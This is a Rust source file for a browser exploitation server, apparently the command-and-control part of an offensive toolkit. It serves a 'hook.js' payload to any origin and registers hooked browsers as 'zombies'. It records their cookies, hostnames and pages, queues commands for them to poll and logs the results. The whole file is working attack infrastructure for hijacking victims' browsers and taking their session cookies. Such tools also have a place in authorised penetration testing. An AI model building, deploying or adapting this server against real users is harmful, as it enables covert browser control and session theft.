use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener};
use std::sync::{Arc, RwLock};
use std::thread;

use crate::modules::exploit::browser::command::{BrowserCommand, CommandResult};
use crate::modules::exploit::browser::hook;
use crate::modules::exploit::browser::manager::RbbManager;
use crate::modules::exploit::browser::session::{Zombie, ZombieStatus};
use crate::protocols::http::{HttpRequest, HttpResponse};
use crate::{debug, error, info, warn};
use ::serde_json;

/// Browser Exploitation Server
///
/// Can operate in two modes:
/// 1. Standalone: Uses internal state (legacy mode)
/// 2. Managed: Uses shared RbbManager for TUI integration
pub struct BrowserServer {
    addr: SocketAddr,
    /// Shared manager for TUI integration (if provided)
    manager: Option<RbbManager>,
    /// Legacy: Connected zombies (SessionID -> Zombie)
    zombies: Arc<RwLock<HashMap<String, Zombie>>>,
    /// Legacy: Command queues (SessionID -> Vec<Command>)
    queues: Arc<RwLock<HashMap<String, Vec<BrowserCommand>>>>,
}

impl BrowserServer {
    /// Create server with internal state (standalone mode)
    pub fn new(addr: SocketAddr) -> Self {
        Self {
            addr,
            manager: None,
            zombies: Arc::new(RwLock::new(HashMap::new())),
            queues: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    /// Create server with shared manager (for TUI integration)
    pub fn with_manager(addr: SocketAddr, manager: RbbManager) -> Self {
        Self {
            addr,
            manager: Some(manager),
            zombies: Arc::new(RwLock::new(HashMap::new())),
            queues: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    /// Get the shared manager (if any)
    pub fn manager(&self) -> Option<&RbbManager> {
        self.manager.as_ref()
    }

    /// Add a command to the queue for a specific zombie
    pub fn queue_command(&self, zombie_id: &str, command: BrowserCommand) {
        if let Some(ref mgr) = self.manager {
            mgr.queue_command(zombie_id, command);
        } else {
            let mut queues = self.queues.write().unwrap();
            queues
                .entry(zombie_id.to_string())
                .or_insert_with(Vec::new)
                .push(command);
        }
    }

    /// List currently active zombies
    pub fn list_zombies(&self) -> Vec<Zombie> {
        if let Some(ref mgr) = self.manager {
            mgr.list_zombies()
        } else {
            let zombies = self.zombies.read().unwrap();
            zombies.values().cloned().collect()
        }
    }

    pub fn run(&self) -> Result<(), String> {
        let listener = TcpListener::bind(self.addr)
            .map_err(|e| format!("Failed to bind to {}: {}", self.addr, e))?;

        info!("Browser Exploitation Server listening on {}", self.addr);
        info!(
            "Hook URL: http://{}:{}/hook.js",
            self.addr.ip(),
            self.addr.port()
        );

        // Clone resources for threads
        let zombies = self.zombies.clone();
        let queues = self.queues.clone();
        let manager = self.manager.clone();
        let addr_str = self.addr.to_string();

        // Main server loop
        for stream in listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let zombies = zombies.clone();
                    let queues = queues.clone();
                    let manager = manager.clone();
                    let server_addr = addr_str.clone();

                    thread::spawn(move || {
                        let mut buffer = [0u8; 4096];
                        if let Ok(n) = stream.read(&mut buffer) {
                            if n == 0 {
                                return;
                            }

                            // Parse request using our robust protocol parser
                            if let Some(req) = HttpRequest::parse(&buffer[..n]) {
                                let mut response =
                                    HttpResponse::simple(404, "Not Found", "404 Not Found");

                                // Routing
                                if req.path == "/hook.js" {
                                    // Serve the JS payload
                                    let js =
                                        hook::generate_hook_js(&format!("http://{}", server_addr));
                                    response = HttpResponse::simple(200, "OK", &js);
                                    response.headers.insert(
                                        "content-type".to_string(),
                                        "application/javascript".to_string(),
                                    );
                                    // Add CORS to allow hooking from ANY origin
                                    response.headers.insert(
                                        "access-control-allow-origin".to_string(),
                                        "*".to_string(),
                                    );
                                } else if req.path == "/init" && req.method == "POST" {
                                    // Initial beacon
                                    handle_init(
                                        &req,
                                        manager.as_ref(),
                                        &zombies,
                                        stream.peer_addr().ok(),
                                    );
                                    response =
                                        HttpResponse::simple(200, "OK", "{\"status\":\"ok\"}");
                                    response.headers.insert(
                                        "access-control-allow-origin".to_string(),
                                        "*".to_string(),
                                    );
                                } else if req.path.starts_with("/poll") {
                                    // Polling for commands
                                    if let Some(cmds) =
                                        handle_poll(&req, manager.as_ref(), &zombies, &queues)
                                    {
                                        let json = serde_json::to_string(&cmds)
                                            .unwrap_or("[]".to_string());
                                        response = HttpResponse::simple(200, "OK", &json);
                                        response.headers.insert(
                                            "content-type".to_string(),
                                            "application/json".to_string(),
                                        );
                                    }
                                    response.headers.insert(
                                        "access-control-allow-origin".to_string(),
                                        "*".to_string(),
                                    );
                                } else if req.path == "/response" && req.method == "POST" {
                                    // Result of a command
                                    handle_response(&req, manager.as_ref());
                                    response = HttpResponse::simple(200, "OK", "{}");
                                    response.headers.insert(
                                        "access-control-allow-origin".to_string(),
                                        "*".to_string(),
                                    );
                                } else if req.method == "OPTIONS" {
                                    // Handle CORS preflight
                                    response = HttpResponse::simple(200, "OK", "");
                                    response.headers.insert(
                                        "access-control-allow-origin".to_string(),
                                        "*".to_string(),
                                    );
                                    response.headers.insert(
                                        "access-control-allow-headers".to_string(),
                                        "Content-Type".to_string(),
                                    );
                                    response.headers.insert(
                                        "access-control-allow-methods".to_string(),
                                        "POST, GET, OPTIONS".to_string(),
                                    );
                                }

                                let _ = stream.write_all(&response.to_bytes());
                            }
                        }
                    });
                }
                Err(e) => error!("Connection failed: {}", e),
            }
        }

        Ok(())
    }
}

// Helpers

fn handle_init(
    req: &HttpRequest,
    manager: Option<&RbbManager>,
    zombies: &Arc<RwLock<HashMap<String, Zombie>>>,
    peer: Option<SocketAddr>,
) {
    // Parse JSON body
    if let Ok(json) = serde_json::from_slice::<serde_json::Value>(&req.body) {
        if let Some(id) = json["id"].as_str() {
            let mut zombie = Zombie::new(
                id.to_string(),
                peer.map(|a| a.ip().to_string())
                    .unwrap_or("unknown".to_string()),
            );

            // Populate fields
            if let Some(ua) = json["ua"].as_str() {
                zombie.user_agent = ua.to_string();
            }
            if let Some(loc) = json["loc"].as_str() {
                zombie.page = loc.to_string();
            }
            if let Some(host) = json["host"].as_str() {
                zombie.hostname = host.to_string();
            }
            if let Some(cookie) = json["cookie"].as_str() {
                zombie.cookies = cookie.to_string();
            }
            if let Some(platform) = json["platform"].as_str() {
                zombie.os = platform.to_string();
            }

            // Use manager if available, otherwise use legacy storage
            if let Some(mgr) = manager {
                let is_new = mgr.get(id).is_none();
                mgr.upsert(zombie.clone());

                if is_new {
                    info!("Zombie connected! ID: {} IP: {}", id, zombie.ip);
                    info!("Host: {} Page: {}", zombie.hostname, zombie.page);
                } else {
                    debug!("Zombie heartbeat: {}", id);
                }
            } else {
                let mut map = zombies.write().unwrap();
                let is_new = !map.contains_key(id);

                if is_new {
                    info!("Zombie connected! ID: {} IP: {}", id, zombie.ip);
                    info!("Host: {} Page: {}", zombie.hostname, zombie.page);
                } else {
                    debug!("Zombie heartbeat: {}", id);
                }

                map.insert(id.to_string(), zombie);
            }
        }
    }
}

fn handle_poll(
    req: &HttpRequest,
    manager: Option<&RbbManager>,
    zombies: &Arc<RwLock<HashMap<String, Zombie>>>,
    queues: &Arc<RwLock<HashMap<String, Vec<BrowserCommand>>>>,
) -> Option<Vec<BrowserCommand>> {
    // Extract ID from query param ?id=XYZ
    // path is like "/poll?id=xyz"
    let id_start = req.path.find("id=")?;
    let id = &req.path[id_start + 3..];

    // Use manager if available
    if let Some(mgr) = manager {
        let cmds = mgr.drain_commands(id);
        if !cmds.is_empty() {
            info!("Sent {} commands to Zombie {}", cmds.len(), id);
        }
        return Some(cmds);
    }

    // Legacy mode: use internal HashMaps
    {
        let mut z_map = zombies.write().unwrap();
        if let Some(zombie) = z_map.get_mut(id) {
            zombie.heartbeat();
        }
    }

    // Pop commands
    let mut q_map = queues.write().unwrap();
    if let Some(queue) = q_map.get_mut(id) {
        if !queue.is_empty() {
            let cmds = queue.clone();
            queue.clear();
            info!("Sent {} commands to Zombie {}", cmds.len(), id);
            return Some(cmds);
        }
    }

    Some(vec![])
}

fn handle_response(req: &HttpRequest, manager: Option<&RbbManager>) {
    if let Ok(json) = serde_json::from_slice::<serde_json::Value>(&req.body) {
        let session_id = json["session_id"].as_str().unwrap_or("");
        let cmd_id = json["cmd_id"].as_str().unwrap_or("?");
        let output = json["output"].as_str().unwrap_or("");
        let error = json["error"].as_bool().unwrap_or(false);

        // Record result in manager if available
        if let Some(mgr) = manager {
            let result = CommandResult {
                command_id: cmd_id.to_string(),
                output: output.to_string(),
                error,
            };
            mgr.record_result(session_id, result);
        }

        if error {
            warn!("Command {} failed: {}", cmd_id, output);
        } else {
            info!("Command {} result:\n{}", cmd_id, output);
        }
    }
}
